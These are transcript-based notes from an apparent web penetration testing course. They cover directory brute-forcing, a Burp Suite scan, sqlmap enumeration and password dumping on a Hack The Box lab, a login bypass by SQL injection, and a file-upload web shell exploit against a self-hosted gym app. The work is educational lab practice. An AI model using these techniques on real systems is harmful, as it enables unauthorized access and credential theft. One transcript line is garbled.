> **Code Keywords:** let (6), case. (1), this. (1), interface (1), case, (1)
> **CLI Commands:** find (4), apache (3), make (1), sudo (1)
> **Env Vars:** url (3), dns (1), axfr (1)
> **Definitions:** is a  (4)
> **URLs:** [example1.com](https://example1.com) (1), [example2.com](https://example2.com) (1), [http://cronos.htb](http://cronos.htb) (1)
> **Versions:** 10.10.10 (3)
> **Warnings:** be aware (1)
> **Speakers:** - [instructor] (1)

#### More ways to find web pages
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=0)** - [Instructor] Let's look at another tool for enumerating websites called DirBuster.
>
> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=5)** We can find this in applications, web application analysis, web crawlers, and directory brute force tools.
>
> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=13)** DirBuster is a graphical interface for doing a dictionary or brute force attack on a website to identify new top level pages.
>
> **[0:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=21)** It's the gooey form of Gobuster.
>
> **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=25)** Let's use it to take a look at the offensive security target called Lampião.
>
> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=30)** I already know from enumeration that there's nothing on Port 80, but a second website exists on Port 1898.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=39)** So let's enter the URL: [http://192.168.60.48.1898](http://192.168.60.48.1898) [http://192.168.60.48.1898](http://192.168.60.48.1898) Let's leave the work type and scanning methods as default, but increase the Number Of Threads to 25 to increase the speed of scanning.
>
> **[1:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=60)** We'll need to select a dictionary to use.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=63)** We'll use the same lowercase dictionary as before and we'll go into user, share, wordlists, DirBuster, and our directory-list-lowercase-medium.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=83)** DirBuster is set by default to brute force both folders and files, and PHP files, types are selected.
>
> **[1:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=91)** 'Kay, so let's start the scan.
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=96)** We can see in the panel the folders that we're finding as we go.
>
> **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=100)** We can see progress at the right-hand bar for each stream of work, and at the bottom right, we can see the folder names we're testing for.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=109)** We can select Tree View to look at a more compact view of the site as we're finding it.
>
> **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=116)** There's a lot of configuration we can do in DirBuster.
>
> **[1:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=119)** Let's have a look at the Options menu and the Advanced Options.
>
> **[2:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=125)** An Advanced Options window pops up with five tabs.
>
> **[2:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=129)** We're on the first tab, which is HTML Parsing Options.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=133)** This shows which elements of the page, DirBuster, will extract links from.
>
> **[2:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=138)** We can right click on a link in the middle pane and we get an option to delete it.
>
> **[2:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=145)** Below this pane, we can add another element.
>
> **[2:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=150)** We can also say, above this pane that we're not going to process any links to image files.
>
> **[2:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=156)** Let's check out Authentication Options.
>
> **[2:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=159)** This is where we can add a user ID and a password to get access to authenticated areas of the website.
>
> **[2:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=166)** The next tab is Http Options.
>
> **[2:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=170)** And in here, at the top, we can add Custom HTTP Headers.
>
> **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=174)** It's not uncommon to find HTTP servers using custom headers including X-Powered-By, X-Cash, X-Pingback, X-Forwarded-For, and X-HTTP-Method-Override.
>
> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=187)** WordPress, for example, uses X-Powered-By and X-Pingback.
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=192)** Note, we have to have a strinouncing itself as the user agent, a clear giveaway in a red team that the risk reconnaissance is underway.
>
> **[3:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=201)** This is one field you may wish to change.
>
> **[3:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=205)** We're not running through a proxy right now, but we could stage this through Burp Suite if we wanted to inspect the messages.
>
> **[3:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=212)** The next tab is Scan Options.
>
> **[3:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=215)** And here, we can set the timeout value for the message and also provide an upper limit on the number of requests per second if we want to be a little bit more stealthy.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=227)** The final tab, DirBuster Options, allows us to update DirBuster and set the Number of threads to run and the File extensions.
>
> **[3:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=234)** Duplicating what we can do from the main screen.
>
> **[3:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=239)** Okay, let's leave DirBuster for now.
>
> **[4:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=242)** DIRB is another dictionary-based enumeration tool which is simple to use and runs relatively quickly using a built-in set of common folders and file names.
>
> **[4:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=253)** DIRB runs from the command line and in its simplest form, takes the URL as an argument.
>
> **[4:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=259)** Let's run this against Lampião.
>
> **[4:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=260)** dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) dirb [http://192.168.60.48:1898](http://192.168.60.48:1898) We can see, it's picked up its own common dictionary and is running through that.
>
> **[4:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=280)** This happens very quickly and we find the folders that we saw earlier with DirBuster.
>
> **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=286)** DIRB also provides some options.
>
> **[4:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=288)** We can specify our own word list and we can indicate extensions to try such as HTML or PHP.
>
> **[4:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=298)** The final Carly tool we'll look at for finding web pages is Wfuzz.
>
> **[5:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=303)** While it's not specifically designed to look for hidden pages, we can use it for this purpose.
>
> **[5:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=308)** It needs to know the word list to use and the URL to start with, and we can also tell it what responses to ignore.
>
> **[5:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=316)** For example, we'll ignore 404 Page Not Found.
>
> **[5:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=320)** wfuzz -c -z wfuzz -c -z file,/usr/share/ file,/usr/share/ wordlists/dirbuster/ directory-list-lowercase-2.3-medium.txt directory-list-lowercase-2.3-medium.txt
>
> **[5:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=349)** - -hc=404 [http://192.168.60.48:1898](http://192.168.60.48:1898) [http://192.168.60.48:1898](http://192.168.60.48:1898) [http://192.168.60.48:1898](http://192.168.60.48:1898) and we use /FUZZ/ at the end.
>
> **[6:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=367)** and we use /FUZZ/ at the end.
>
> **[6:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=371)** We can see, it's detecting various lines of text which we're not interested in, as well as valid folders.
>
> **[6:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=376)** We can see icons, themes, scripts, and other folders being detected.
>
> **[6:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=381)** Wfuzz is very fast and it can be used to get a top level short list of URLs to test.
>
> **[6:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=387)** You'll quickly get used to your favorite tool and you'll develop your own dictionary files for each type of target.
>
> **[6:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/more-ways-to-find-web-pages?u=76281980&t=394)** Carly provides a good range of word lists across its tools and you can add to these as you progress.

> [!info]- Semantic Content
>
> **Code Keywords:** let (9), interface (1), default, (1), for. (1), from. (1)
> **Env Vars:** url (3), http (3), dirb (3), php (2), html (2)
> **Versions:** 192.168.60 (8), 48.1898 (2), 2.3 (2)
> **URLs:** [http://192.168.60.48:1898](http://192.168.60.48:1898) (6), [http://192.168.60.48.1898](http://192.168.60.48.1898) (2)
> **Ports:** :1898 (6), port 80 (1), port 1898 (1)
> **CLI Commands:** find (3), php (2)
> **Analogies:** for example (2), such as (1)
> **File Paths:** directory-list-lowercase-2.3-medium.txt (2)


### 4. Finding Vulnerabilities

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Vulnerability scanning with Burp Suite
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=0)** - [Instructor] The tool most professional pen testers use for web testing is Burp Suite, and we'll be using it for our advanced testing.
>
> **[0:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=8)** Carly includes the free community version, but this doesn't support vulnerability scanning, the professional edition does, and we'll use that to learn how to crawl a website to look for vulnerabilities.
>
> **[0:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=21)** If you are not familiar with Burp Suite, do take my Burp Suite Essentials course to get started.
>
> **[0:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=27)** Web application scanning is one of the most important defensive measures we can take to protect our websites, but it takes time, and a typical scan will produce a large number of issues.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=39)** These need to be filtered out to those which are an exploitation risk, and this requires that we combine a scan with targeted penetration testing, to demonstrate which of the scan findings are exploitable issues.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=53)** Let's check the hack the box popcorn web application for vulnerabilities.
>
> **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=58)** We already know from earlier enumeration, that the server has a Torrent application running.
>
> **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=65)** To start our web scan, we'll select proxy, and we'll turn intercept off, and we'll open a browser.
>
> **[1:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=75)** And we'll connect to 10.10.10.6/torrent.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=83)** Back in Burp Suite, we'll go to target and have a look at the site map, and we can see the Torrent folder, we'll right click and select scan.
>
> **[1:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=98)** Here we can set the scan parameters.
>
> **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=100)** We set to crawl and audit the popcorn site, using HTTP and HTTPS.
>
> **[1:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=106)** We'll change the scan to use the specified protocol HTTP.
>
> **[1:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=113)** And we'll press okay.
>
> **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=116)** Back at the dashboard, we can see in the left pane, that an unauthenticated crawl has started, and we've already detected some information rated audit issues, as well as a high rated issue.
>
> **[2:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=129)** Crawling a website takes a while, so we'll come back when this finishes.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=135)** Once all the crawling has finished, Burp Suite begins its audit.
>
> **[2:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=139)** It starts by identifying the items it wants to audit.
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=143)** As the audit progresses, we can see issues being added in the top right hand issues pane.
>
> **[2:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=151)** Back on the site map, we can see red dots starting to appear beside pages with high severity issues.
>
> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=158)** At the right, we can see there's a high severity issue on clear text submission of password.
>
> **[2:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=163)** When we click on that, we get the vulnerability summary shown in the lower panel.
>
> **[2:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=170)** Below that, we find the background explaining the issue, and also the steps we need to take to remediate it.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=178)** At the bottom, we find links to further details for the vulnerability.
>
> **[3:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=183)** We'll let the audit continue and leave popcorn for now.
>
> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/vulnerability-scanning-with-burp-suite?u=76281980&t=187)** Doing a scan provides a lot of useful information for us, in securing our website.

> [!info]- Semantic Content
>
> **Code Keywords:** let (2), while, (1), continue (1)
> **Env Vars:** http (2), https (1)
> **CLI Commands:** find (2)
> **UI Navigation:** go to (1), click on (1)
> **Versions:** 10.10.10 (1)
> **Speakers:** - [instructor] (1)

#### Using sqlmap to validate SQL injections
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=0)** - Let's take a look at how we approach validation of a web server issue using sqlmap.
>
> **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=6)** We've done our web app testing on the hackthebox popcorn server and we've found a torrent page which is injectable.
>
> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=13)** In order to demonstrate the vulnerability, we'll start by going to "proxy", make sure Intercept is off, and open the browser.
>
> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=24)** And we'll connect to 10.10.10.6/torrent.
>
> **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=33)** And we'll enter "admin", "admin", and that doesn't work.
>
> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=43)** But we want to validate that it is an SQL injection vulnerability.
>
> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=48)** So let's now go back to Burp Suite and to "HTTP history" and look for the "POST" message.
>
> **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=58)** We'll select this and in the Request details at the bottom, select "Copy to file" and we'll call that "popreq" and save it.
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=70)** In the Kali terminal, we can use this to run an sqlmap test: "sqlmap -r popreq" As we start running, we'll be asked a few questions and we can take the defaults.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=89)** That's done, and we found an injection point, so we can now repeat the sqlmap request, adding the dbs switch to use the injections sqlmap found to list all databases.
>
> **[1:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=105)** Let's select the "torrenthoster" database and run sqlmap again to find its tables.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=120)** And we get a list of tables.
>
> **[2:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=123)** We can select the "users" table and dump out its contents.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=133)** We can see we have an admin password and sqlmap can try to crack it for us.
>
> **[2:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=138)** We'll try with the rockyou.txt dictionary file.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=153)** Okay, we'll leave that to see if it can crack the password, and we'll come back to it when the crack finishes.
>
> **[2:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=161)** Well, we weren't successful with cracking the hash in this case, but we still got plenty of evidence that there's a significant issue.
>
> **[2:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/using-sqlmap-to-validate-sql-injections?u=76281980&t=169)** Sqlmap is a powerful tool to check for, and exploit, vulnerabilities in backend SQL databases, so that we can validate our scan results.

> [!info]- Semantic Content
>
> **Code Keywords:** let (3), switch (1), case, (1), for, (1)
> **Env Vars:** sql (2), http (1), post (1)
> **UI Navigation:** select the (2), open the (1), switch to (1)
> **CLI Commands:** make (1), find (1)
> **Definitions:** is an  (1), is a  (1)
> **File Paths:** rockyou.txt (1)
> **Versions:** 10.10.10 (1)
> **Cross-References:** go back to (1)


### 5. Attacking the Website

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Exploiting your way into the gym
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=0)** - Let's take a look at this gym management system which we can download from the source code tester site Shown here.
>
> **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=7)** This is a standard website which runs on a lamp stack system.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=11)** I've downloaded and unzipped this application.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=15)** We can see this is a PHP website, and if we have a look in the database folder, we can see the setup script for it.
>
> **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=26)** The installation instructions require us to set up the application by importing this setup script.
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=32)** In addition, we need to modify the DB connect .pi script and update it with our privileged SQL user credentials.
>
> **[0:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=40)** I've done this already, so let's go take a look at it.
>
> **[0:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=45)** 192 dot 168 dot 1 dot 176 slash gym 1.
>
> **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=56)** Okay, we're asked to enter credentials.
>
> **[0:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=59)** Our first exploit will be the obvious one.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=61)** We'll run an SQL injection by entering the user account as quote space
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=70)** - Or
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=71)** - One equals one
>
> **[1:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=73)** - Hash
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=77)** - And we've logged in as the administrative user.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=82)** There's a slightly more advanced version of the gym management system that we can find at this site and this particular variant has an upload function which we can exploit.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=93)** We can search for exploits of gym systems using search 'sploit space Gym, and we find there's a Python script for an unauthenticated remote code execution which is for this system.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=109)** So let's copy Slash user slash share slash exploit db slash exploits slash php web apps 4 8 5 0 6 dot py
>
> **[2:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=132)** - Into our current folder.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=135)** - Unfortunately, this particular script doesn't run out of the box and we have to make some changes to it.
>
> **[2:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=141)** I've taken a lot of the fancy formatting out and simplified the exploit code and made it Python three usable.
>
> **[2:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=148)** So let's take a quick look at that.
>
> **[2:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=151)** Nano, and I've called it "exgym" Dot py.
>
> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=157)** - We go down past the comments.
>
> **[2:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=159)** We can see that the exploit runs in two stages.
>
> **[2:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=166)** The first is to upload a file called kamehameha dot php using the upload PHP function in the gym management system.
>
> **[2:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=172)** This has a PNG header on it to make it look like a PNG image file.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=178)** The second is then to run the kamehameha php code passing in a command using the telepathy variable which it executes.
>
> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=189)** Okay, let's try running this.
>
> **[3:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=193)** Python three exgym dot py and we want to send this to 192 dot 168 dot 1 dot 176 slash gym2.
>
> **[3:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=212)** Okay, we've now got command prompt and we can start issuing commands.
>
